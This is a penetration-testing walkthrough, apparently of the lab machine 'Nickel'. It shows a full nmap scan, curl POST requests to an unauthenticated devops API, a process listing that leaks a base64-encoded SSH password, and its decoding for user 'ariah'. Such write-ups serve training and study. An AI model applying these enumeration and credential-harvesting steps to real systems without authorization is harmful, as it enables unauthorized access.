First start with an nmap scan 

`nmap -sC -sV -T4 -oN nmap.txt -p- <IP>`

```
# Nmap 7.93 scan initiated Mon Dec 26 21:25:48 2022 as: nmap -sC -sV -T4 -oN fullmap.txt -Pn -p- -v 192.168.108.99
Nmap scan report for 192.168.108.99
Host is up (0.23s latency).    
Not shown: 65528 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION                                              
21/tcp    open  ftp           FileZilla ftpd
| ftp-syst:                
|_  SYST: UNIX emulated by FileZilla
22/tcp    open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:                                                                     
|   3072 8684fdd5432705cfa7f2e9e27570d5f3 (RSA)
|   256 9c93cf48a94e70f460dee1a9c2c0b6ff (ECDSA)
|_  256 004ed73b0f9fe3744d04990bb18bdea5 (ED25519)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn          
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:                                                                   
|   Target_Name: NICKEL                                                            
|   NetBIOS_Domain_Name: NICKEL         
|   NetBIOS_Computer_Name: NICKEL                                                  
|   DNS_Domain_Name: nickel
|   DNS_Computer_Name: nickel  
|   Product_Version: 10.0.18362         
|_  System_Time: 2022-12-26T20:45:04+00:00 
|_ssl-date: 2022-12-26T20:46:08+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=nickel
| Issuer: commonName=nickel
| Public Key type: rsa                                                             
| Public Key bits: 2048                                                                                                                                               
| Signature Algorithm: sha256WithRSAEncryption     
| Not valid before: 2022-11-13T02:21:18
| Not valid after:  2023-05-15T02:21:18                                            
| MD5:   a1464414b419ed70f0171b73d1faf05a                                                                                                                             
|_SHA-1: 30ccd223328773a19aea7c650c20504ea285edb3                                                                                                                     
8089/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0           
|_http-favicon: Unknown favicon MD5: 9D1EAD73E678FA2F51A70A933B0BF017
|_http-trane-info: Problem with XML parsing of /evox/about                         
|_http-title: Site doesn't have a title.
33333/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)              
| http-methods:            
|_  Supported Methods: GET POST
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows     
                                         
Host script results:       
|_smb2-time: ERROR: Script execution failed (use -d to debug)                      
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!                                                                             
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
                                         
Read data files from: /usr/bin/../share/nmap                                       
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                        
# Nmap done at Mon Dec 26 21:46:13 2022 -- 1 IP address (1 host up) scanned in 1224.76 seconds
```

Got intresting ports, starting with the enumeration of 8089 which is http serivice 

![image](https://user-images.githubusercontent.com/87468669/209654766-7bad6ee2-038f-447d-a039-dfe9864081ff.png)

Hmmmm a devops dashboard... check the page source

![image](https://user-images.githubusercontent.com/87468669/209655743-2f019960-a12c-49e6-bbe1-bf5953a50364.png)

It is redirecting to another IP addr and port entirely... let's try using curl to test.

![image](https://user-images.githubusercontent.com/87468669/209656471-b60a3673-8262-471a-b490-84a3c703235f.png)

the request returned an invalid token. let's try change request from GET to POST.

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Nickel]
└─$ curl -X POST -d "valid token" -v http://192.168.145.99:33333/ 
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.145.99:33333...
* Connected to 192.168.145.99 (192.168.145.99) port 33333 (#0)
> POST / HTTP/1.1
> Host: 192.168.145.99:33333
> User-Agent: curl/7.85.0
> Accept: */*
> Content-Length: 11
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 22
< Server: Microsoft-HTTPAPI/2.0
< Date: Tue, 27 Dec 2022 10:58:56 GMT
< 
* Connection #0 to host 192.168.145.99 left intact
<p>Not Implemented</p> 

┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Nickel]
└─$ curl -X POST -d "valid token" -v http://192.168.145.99:33333/list-current-deployments
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.145.99:33333...
* Connected to 192.168.145.99 (192.168.145.99) port 33333 (#0)
> POST /list-current-deployments HTTP/1.1
> Host: 192.168.145.99:33333
> User-Agent: curl/7.85.0
> Accept: */*
> Content-Length: 11
> Content-Type: application/x-www-form-urlencoded
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Length: 22
< Server: Microsoft-HTTPAPI/2.0
< Date: Tue, 27 Dec 2022 10:59:42 GMT
< 
* Connection #0 to host 192.168.145.99 left intact
<p>Not Implemented</p>
```

Kept trying it for each links i found in the source page of the web service on port 8089 

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/PGP/Nickel]                             
└─$ curl -X POST -d "valid token" -v http://192.168.145.99:33333/list-running-procs  
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 192.168.145.99:33333...                                                 
* Connected to 192.168.145.99 (192.168.145.99) port 33333 (#0)                                                                                                        
> POST /list-running-procs HTTP/1.1                                                
> Host: 192.168.145.99:33333                                                       
> User-Agent: curl/7.85.0                
> Accept: */*                                                                      
> Content-Length: 11                                                               
> Content-Type: application/x-www-form-urlencoded
>                                                                                  
* Mark bundle as not supporting multiuse 
< HTTP/1.1 200 OK                        
< Content-Length: 3139                                                             
< Server: Microsoft-HTTPAPI/2.0                                                    
< Date: Tue, 27 Dec 2022 11:02:19 GMT    
<                                                                                  
                                                                                   
                                         
name        : System Idle Process                                                  
commandline :                                                                      
                                         
name        : System                                                                                                                                                  
commandline :                                                                                                                                                         
                                                                                   
name        : Registry                                                             
commandline :                            
                                                                                   
name        : smss.exe                                                                                                                                                
commandline :                                                                      
                                                                                   
name        : csrss.exe                                                            
commandline :          
                                         
name        : wininit.exe                                                          
commandline :                                                                      
                                                                                   
name        : csrss.exe 
commandline :          
                                         
name        : wininit.exe                                                          
commandline :                                                                      
                                                                                   
name        : csrss.exe                                                            
commandline : 

name        : winlogon.exe
commandline : winlogon.exe

name        : services.exe
commandline : 

name        : lsass.exe
commandline : C:\Windows\system32\lsass.exe

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : fontdrvhost.exe
commandline : "fontdrvhost.exe"

name        : LogonUI.exe
commandline : "LogonUI.exe" /flags:0x2 /state0:0xa3bd3855 /state1:0x41c64e6d

name        : dwm.exe
commandline : "dwm.exe"

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws80.ps1

name        : Memory Compression
commandline : 

name        : cmd.exe
commandline : cmd.exe C:\windows\system32\DevTasks.exe --deploy C:\work\dev.yaml --user ariah -p 
              "Tm93aXNlU2xvb3BUaGVvcnkxMzkK" --server nickel-dev --protocol ssh
              
name        : powershell.exe                                                                                                                                  [30/103]
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws8089.ps1

name        : powershell.exe
commandline : powershell.exe -nop -ep bypass C:\windows\system32\ws33333.ps1

name        : spoolsv.exe
commandline : C:\Windows\System32\spoolsv.exe

name        : FileZilla Server.exe
commandline : "C:\Program Files (x86)\FileZilla Server\FileZilla Server.exe"

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe"

name        : VGAuthService.exe
commandline : "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"

name        : vmtoolsd.exe
commandline : "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"

name        : dllhost.exe
commandline : C:\Windows\system32\dllhost.exe /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}

name        : msdtc.exe
commandline : C:\Windows\System32\msdtc.exe

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : conhost.exe
commandline : \??\C:\Windows\system32\conhost.exe 0x4

name        : WmiPrvSE.exe
commandline : C:\Windows\system32\wbem\wmiprvse.exe

name        : SgrmBroker.exe
commandline : 

name        : SearchIndexer.exe
commandline : C:\Windows\system32\SearchIndexer.exe /Embedding

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe" -R

name        : sshd.exe
commandline : "C:\Program Files\OpenSSH\OpenSSH-Win64\sshd.exe" -z

name        : conhost.exe
commandline : C:\Windows\system32\conhost.exe --headless --width 166 --height 40 --signal 0x1dc -- 
              "c:\windows\system32\cmd.exe"

name        : cmd.exe
commandline : c:\windows\system32\cmd.exe 

name        : powershell.exe
commandline : powershell.exe  -nop -ep bypass



* Connection #0 to host 192.168.145.99 left intact
```

![image](https://user-images.githubusercontent.com/87468669/209657610-e8e7c9df-3bb0-4c03-b726-a808cedfab4a.png)

Bullseye got an ssh cred... username: `ariah`, password is base64 encode `Tm93aXNlU2xvb3BUaGVvcnkxMzkK` decoded to `NowiseSloopTheory139`

![image](https://user-images.githubusercontent.com/87468669/209658900-4fd5f51a-78a3-4f5a-978c-033fd2bf23af.png)

ssh into the target using the creds found...







